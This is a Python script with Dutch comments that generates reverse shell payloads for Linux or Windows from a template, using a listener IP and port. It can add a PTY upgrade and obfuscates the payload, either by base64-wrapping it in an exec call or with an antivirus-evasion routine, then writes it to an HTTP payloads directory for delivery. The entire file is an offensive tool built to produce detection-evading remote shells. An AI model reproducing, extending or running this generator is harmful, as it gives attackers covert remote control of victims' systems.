#!/usr/bin/python3

# Python Reverse Shell generator
# Genereert plain of obfuscated Python reverse shell payloads

from meuk.hacksec import *
import base64

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP")
parser.add_argument("lport", help="listener port", nargs="?", default="443")
parser.add_argument("mode", help="plain of obfuscated", nargs="?", default="plain")
parser.add_argument("platform", help="linux of windows", nargs="?", default="linux")
parser.add_argument("--pty", action="store_true", help="PTY upgrade toevoegen (alleen linux)")
parser.add_argument("--av-evasion", action="store_true", help="AV signature-aware obfuscatie")
args = parser.parse_args()

print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating Python reverse shell for {bcolors.OKGREEN}{args.lhost}:{args.lport}{bcolors.OKBLUE} ({args.mode}, {args.platform}){bcolors.ENDC}")

template = lezen("meuk/template/pyrevshell.py")

shell_binary = "/bin/sh" if args.platform == "linux" else "cmd.exe"

payload = template.replace("[host]", args.lhost)
payload = payload.replace("[port]", args.lport)
payload = payload.replace("[shell]", shell_binary)

if args.pty and args.platform == "linux":
    # Vervang subprocess.call regel met PTY variant
    payload = payload.replace(
        'subprocess.call(["/bin/sh","-i"])',
        'import pty;pty.spawn("/bin/sh")'
    )

if args.av_evasion:
    from obfuscate_av import obfuscate_text
    payload, py_stats = obfuscate_text(payload, "python")
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Python AV obfuscatie: {py_stats['string']} signatures aangepast{bcolors.ENDC}")
elif args.mode == "obfuscated":
    encoded = base64.b64encode(payload.encode()).decode()
    payload = f"exec(__import__('base64').b64decode('{encoded}'))"

schrijven("http/payloads/revshell.py", payload)
print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Python reverse shell geschreven naar: http/payloads/revshell.py{bcolors.ENDC}")
